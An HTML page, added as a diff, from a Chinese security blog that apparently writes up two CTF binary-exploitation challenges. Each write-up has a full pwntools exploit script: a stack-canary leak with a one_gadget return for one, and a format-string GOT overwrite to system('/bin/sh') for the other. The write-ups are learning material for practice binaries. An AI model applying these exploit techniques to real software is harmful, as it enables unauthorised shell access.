@@ -1,0 +1,517 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>师傅给的2道pwn题 - V1ct0r的博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="题目一：read_note：
+一波分析：
+这里开了栈溢出保护，堆栈不可执行，然后还有内存地址随机化，只有got还可以写，适应了就好~
+
+动态链接，库是libc.so.6，可以得到，再去看看ida吧：,"> 
+    <meta name="author" content="V1ct0r"> 
+    <link rel="alternative" href="atom.xml" title="V1ct0r的博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+
+    
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+
+    
+<link rel="stylesheet" href="/css/obsidian.css">
+
+    
+<link rel="stylesheet" href="/css/ball-atom.min.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">V1ct0r的博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://yoursite.com">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">师傅给的2道pwn题</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg) ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="/categories/PWN"><b>「
+                    </b>PWN<b> 」</b></a>
+                
+                January 03, 2020
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/01/03/%E5%B8%88%E5%82%85%E7%BB%99%E7%9A%842%E9%81%93pwn%E9%A2%98/" title="师傅给的2道pwn题" class="">师傅给的2道pwn题</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    19k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    17 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/stack/" rel="tag">stack</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h3 id="题目一："><a href="#题目一：" class="headerlink" title="题目一："></a>题目一：</h3><p>read_note：</p>
+<h3 id="一波分析："><a href="#一波分析：" class="headerlink" title="一波分析："></a>一波分析：</h3><p><img src="https://upload-images.jianshu.io/upload_images/9085575-506f4faedd859794.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<a id="more"></a>这里开了栈溢出保护，堆栈不可执行，然后还有内存地址随机化，只有got还可以写，适应了就好~
+
+<p>动态链接，库是libc.so.6，可以得到，再去看看ida吧：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-aea069957f86e480.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>这里程序大概的流程也出来了，就是让你输入路径（字符串长度为5其实根本不可能），然后能打开该路径下的文件（就是个幌子，没用的），跳过，输入的字符长度大于5，就false，继续执行程序，要写note的大小note_length，还有note的内容，内容在thinking_note这里，会被输出来，然后如果内容的长度不为624，就会报错，重新输入，且输入的位置一样，我们可以去看看栈的分布情况：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-55df23a10e3a98e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>这里我们发现了canary（var_8），由于read函数后面有puts函数，这里就可以leak出canary了从而实现栈溢出了，但是很遗憾的是只能溢出到ret，也就是exp：padding + canary + ebp + ret，这样基本不太可能getshell了，盲区了，有些慌，开始的想法是栈迁移，但是实操了发现还是不行，这里卡了挺久的，上网找资料一条语句能getshell的，找了半天，终于找到了！one_gadget，只要知道基地址，加上在libc库中的偏移，即可一条语句getshell，这里附上大佬写的博客：<a href="http://p4nda.top/2018/03/03/question/" target="_blank" rel="noopener">http://p4nda.top/2018/03/03/question/</a></p>
+<h3 id="思路整理："><a href="#思路整理：" class="headerlink" title="思路整理："></a>思路整理：</h3><p>1、通过puts函数泄露出canary</p>
+<p>2、通过覆盖后4位去调用函数vul，绕过内存地址随机化</p>
+<p>3、通过puts函数泄露出libc_main_start的真实地址</p>
+<p>4、利用one_gadget直接getshell</p>
+<p>我们一步一步来：</p>
+<p>首先泄露出canary：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-3ed66176c9af0ff4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-52ba91b4a978bcdc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>我通过覆盖canary的低位为\x01，成功把\x0a截断符去掉了，提取出来再加上\x00即可，第一步成功。</p>
+<p>第二步：返回到我们的vul函数：\xA0\X0A（这里爆破法，如果不行就重开，直到行为止）</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-db595340ff7aceb2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>成功以后，我们就直接可以用\xA0\X0A了，下一步，继续，可以看到我们写的payload在栈中的分布了</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-68791a260f3f25e7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>ret的最后4位是0aa0，就是重新调用vul函数，再调用一次后，就可以打印出libc_start_main+240的真实地址了：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-36b9505fd709905a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>这里泄露时，栈大小是0x268，我们直接填满，接着puts就会打印出ret的地址了，</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-5479a0738d197496.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>这样我们知道了真实地址，但是还不是最终的真实地址，要减去240才是，这里需要细心！</p>
+<p>接着找我们的one_gadget~</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-37ce2f7f0fe1e4d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>这里有4个可以用，都要测试下，因为有些不一定能用，这里我们亲测后选择第三个。</p>
+<p>最后就是我们完整的exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#arch也可以是i386~看文件</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./read_note'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"><span class="comment">#标志位,0和１</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        p = process(<span class="string">'./read_note'</span>)</span><br><span class="line">        libc = elf.libc</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">''</span>,)</span><br><span class="line">        libc = ELF(<span class="string">'./'</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'Please input the note path:'</span>)</span><br><span class="line">    p.send(<span class="string">'a'</span>*<span class="number">6</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"  please input the note len:"</span>)</span><br><span class="line">    p.send(<span class="string">'624'</span>)</span><br><span class="line">    p.send(<span class="string">'a'</span>*<span class="number">600</span>+<span class="string">'\x01\x01'</span>) </span><br><span class="line">    p.recvuntil(<span class="string">'\x01\x01'</span>)</span><br><span class="line">    canary = <span class="string">'\x00'</span> + p.recv()[:<span class="number">7</span>]</span><br><span class="line">    <span class="keyword">print</span> hex(u64(canary))</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">600</span></span><br><span class="line">    payload += canary</span><br><span class="line">    payload += <span class="string">'aaaaaaaa'</span></span><br><span class="line">    payload += <span class="string">'\xA0\x0A'</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.recv(timeout = <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        main_libc = libc.symbols[<span class="string">"__libc_start_main"</span>]</span><br><span class="line">        p.send(<span class="string">'a'</span>*<span class="number">6</span>)</span><br><span class="line">        p.recvuntil(<span class="string">"  please input the note len:"</span>)</span><br><span class="line">        p.send(<span class="string">'624'</span>)</span><br><span class="line">        p.send(<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">        payload = <span class="string">'a'</span>*<span class="number">600</span></span><br><span class="line">        payload += canary</span><br><span class="line">        payload += <span class="string">'aaaaaaaa'</span></span><br><span class="line">        payload += <span class="string">'\xA0\x0A'</span></span><br><span class="line">        p.send(payload)</span><br><span class="line">        p.recvuntil(<span class="string">'Please input the note path:'</span>)</span><br><span class="line">        p.send(<span class="string">'a'</span>*<span class="number">6</span>)</span><br><span class="line">        p.recvuntil(<span class="string">"  please input the note len:"</span>)</span><br><span class="line">        p.send(<span class="string">'624'</span>)</span><br><span class="line">        <span class="comment">#debug(0xCA8)</span></span><br><span class="line">        p.send(<span class="string">'a'</span>*<span class="number">0x268</span>)</span><br><span class="line">        main_addr = u64(p.recvuntil(<span class="string">'\x65\x72'</span>)[<span class="number">-9</span>:<span class="number">-3</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">        <span class="keyword">print</span> hex(main_addr)</span><br><span class="line">        base = main_addr - <span class="number">240</span> - main_libc</span><br><span class="line">        system = base + <span class="number">0xf1147</span></span><br><span class="line">        payload = <span class="string">''</span></span><br><span class="line">        payload += <span class="string">'a'</span>*<span class="number">600</span></span><br><span class="line">        payload += canary</span><br><span class="line">        payload += <span class="string">'aaaaaaaa'</span></span><br><span class="line">        payload += p64(system)</span><br><span class="line">        p.send(payload)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="总结下："><a href="#总结下：" class="headerlink" title="总结下："></a>总结下：</h4><p>学习了canary泄露再栈溢出的操作，明白了内存地址随机化的爆破，知道了one_gadget的用法。</p>
+<h3 id="题目二："><a href="#题目二：" class="headerlink" title="题目二："></a>题目二：</h3><p>repeat</p>
+<p>首先checksec一波，然后查看下ida分析逻辑：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-6b14ff79b4de7163.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-fe1817aa7bc0b134.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>这里我们知道，只有堆栈不可执行的保护，开始以为有栈溢出可以搞一波，但是看到了read函数只读了0x50个字节，那么可以知道是没有栈溢出的，buf是0x60，看到了printf（&amp;buf），很明显是格式化字符串漏洞，这里有循环输入，然后跳出的条件是v1=102，看看v1，v2的分布</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-1bc99a6613fcf6f9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>这里可以知道v1后面就是v2，而v2是指向v1的地址的指针，这里往栈中去填a再覆盖是不可能的，因为0x50刚好到10那里，不可以往下了，只能通过任意地址写，那么就是写v2地址的内容，写入102个字节，就可以成功修改v1的值为102，那么即可退出循环，在此之前我们修改puts函数的got为system的got，当调用时写入/bin/sh即可getshell~</p>
+<p>大题思路如下：<br>1、任意地址读泄露lib_start_main的真实地址，得到lib_base</p>
+<p>2、通过lib_base得到system的真实地址</p>
+<p>3、改写puts的got为system的真实地址（单字节写入，写4次，有循环不怕，没有则只能一次写入）</p>
+<p>4、任意地址写修改v2地址里面的v1的值为102</p>
+<p>5、输入/bin/sh就可getshell了</p>
+<p>这是exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./repeat'</span>)</span><br><span class="line">p = process(<span class="string">'./repeat'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">"%31$p"</span>)</span><br><span class="line">main_addr = int(p.recvline(),<span class="number">16</span>)<span class="number">-247</span></span><br><span class="line">offset = main_addr -libc.symbols[<span class="string">"__libc_start_main"</span>]</span><br><span class="line">system_libc = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">system_addr = offset + system_libc</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(system_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p, 'b *0x080485AB')</span></span><br><span class="line">payload_1 = p32(puts_got)</span><br><span class="line">payload_1 += <span class="string">'%'</span> + str((system_addr&amp;<span class="number">0xff</span>)<span class="number">-4</span>) + <span class="string">'c%6$hhn'</span></span><br><span class="line"><span class="comment"># gdb.attach(p,"b *0x80485AB")</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendline(payload_1)</span><br><span class="line">p.recv()</span><br><span class="line">payload_2 = p32(puts_got+<span class="number">1</span>)</span><br><span class="line">payload_2 += <span class="string">'%'</span> + str(((system_addr&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)<span class="number">-4</span>) + <span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendline(payload_2)</span><br><span class="line">p.recv()</span><br><span class="line">payload_3 = p32(puts_got+<span class="number">2</span>)</span><br><span class="line">payload_3 += <span class="string">'%'</span> + str(((system_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)<span class="number">-4</span>) + <span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendline(payload_3)</span><br><span class="line">p.recv()</span><br><span class="line">payload_4 = p32(puts_got+<span class="number">3</span>)</span><br><span class="line">payload_4 += <span class="string">'%'</span> + str(((system_addr&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span>)<span class="number">-4</span>) + <span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendline(payload_4)</span><br><span class="line">p.recv()</span><br><span class="line">payload_5 = <span class="string">'%102c'</span> +<span class="string">'%27$n'</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x080485AB')</span></span><br><span class="line">p.sendline(payload_5)</span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里每右移4吞掉1位数，这样可以用0xff得到最低位的两个数。</p>
+<p>检验下：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9085575-a8eff575d6d40e60.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>单字节地写入是最好的方式，不会报错，也不用检验输入完成。</p>
+<p>这里是循环输入，所以可以用这种打法，如果只有一次printf的话，只能一次性全部写入~</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/statics/chengdu.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d=''
+    >Comments</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
+                    <p>V1ct0r</p>
+                    <span>Where there is a will,there is a way！</span>
+                    <dl>
+                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">62 <p>Articles</p></a></li>
+                    <li><a href="/categories">7 <p>Categories</p></a></li>
+                    <li><a href="/tags">59 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>Contents</h4>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目一："><span class="toc-number">1.</span> <span class="toc-text">题目一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一波分析："><span class="toc-number">2.</span> <span class="toc-text">一波分析：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#思路整理："><span class="toc-number">3.</span> <span class="toc-text">思路整理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目二："><span class="toc-number">4.</span> <span class="toc-text">题目二：</span></a></li></ol>
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2020
+        <span class="gradient-text">
+            V1ct0r
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+
+    
+<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+
+
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
+
+    
+<script src="/js/busuanzi.min.js"></script>
+
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
